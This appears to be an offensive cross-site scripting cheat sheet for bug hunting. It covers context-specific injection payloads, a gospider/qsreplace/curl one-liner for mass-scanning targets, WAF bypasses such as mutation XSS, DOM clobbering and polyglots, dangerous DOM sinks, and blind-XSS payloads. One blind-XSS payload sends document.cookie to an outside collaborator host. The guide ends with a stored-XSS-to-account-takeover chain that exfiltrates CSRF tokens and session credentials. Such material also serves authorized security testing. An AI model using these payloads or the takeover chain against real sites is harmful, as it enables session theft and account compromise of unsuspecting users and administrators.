# Cross-Site Scripting: Beyond <script>alert(1)

## Detection Methodology

### Context-Aware Probing
```html
<!-- Test every injection point by context: -->
<!-- HTML context -->
"><img src=x onerror=confirm(1)>
<!-- Attribute context -->
" onfocus=confirm(1) autofocus="
<!-- JavaScript string context -->
';confirm(1);'
<!-- URL context -->
" onfocus=confirm(1) autofocus="
```

### Automated Discovery Sucks — Manual is Better
```bash
# Automated tools miss context-dependent XSS
# Use gospider + qsreplace for initial canvas
gospider -s https://target.com -d 2 | grep -oP 'https?://[^?]+?=[^&\s]+' | sort -u |   qsreplace '"><img src=x onerror=confirm(1)>' |   while read url; do curl -s "$url" 2>&1 | grep -q "confirm(1)" && echo "$url"; done
```

## WAF Bypass Techniques

### Mutation XSS (mXSS)
```html
<!-- Bypass HTML sanitizers by exploiting parser differentials -->
<details open ontoggle=confirm()>
<summary x= "<script>alert(1)</script>">test
```

### DOM Clobbering
```html
<!-- When you control HTML but not JS execution context -->
<a id=defaultAvatar><a id=defaultAvatar name=href href="x:alert(1)">
```
This overwrites `document.getElementById('defaultAvatar')` and its `href` property.

### Unicode Bypasses
```html
<!-- Case variations -->
<jAvAsCrIpT>alert(1)</sCrIpT>
<!-- Newlines in attributes -->
<img src=x
onerror=alert(1)>
<!-- Tab/CR instead of space -->
<img src=x	onerror=alert(1)>
```

### Polyglot XSS
```html
"";confirm(1);//
<!-- Fires in attribute, script, and CSS contexts simultaneously -->
```

## Stored XSS Hunting

Focus on high-value stored XSS surfaces:
- **Profile fields** (display name, bio, website URL)
- **File metadata** (EXIF data, filename, file description)
- **Collaboration features** (comments, mentions, document titles)
- **Email templates** (subject line, signature, sender name)
- **Admin panels** (site name, description, footer text)

## DOM XSS with Sinks

Modern frontend frameworks reduce reflected XSS but introduce DOM XSS:

```js
// Dangerous sink patterns
element.innerHTML = userControlled;          // Classic
document.write(userControlled);              // Legacy
location.hash.slice(1) + something;          // Hash-based
eval(response.getJSON().callback);           // JSONP
```

Use DOM Invader (Burp) for automated DOM XSS scanning.

## Blind XSS

The highest-impact XSS subtype. Inject payloads that callback to your server:

```html
"><img src=x id=dmEoPoz onerror=eval(atob('Y29uZmlybSgxKQ=='))>
<script>fetch('https://collaborator.oastify.com/?c='+document.cookie)</script>
```

**Where to inject:** User agent strings, referer headers, contact forms, feedback fields, support tickets, log viewers.

### XSS to ATO Chain

1. Stored XSS in profile bio
2. Admin views profile → script executes
3. Script exfiltrates CSRF token + performs sensitive action (add SSH key, create API token, transfer ownership)
4. Attacker uses exfiltrated credentials/session for full ATO
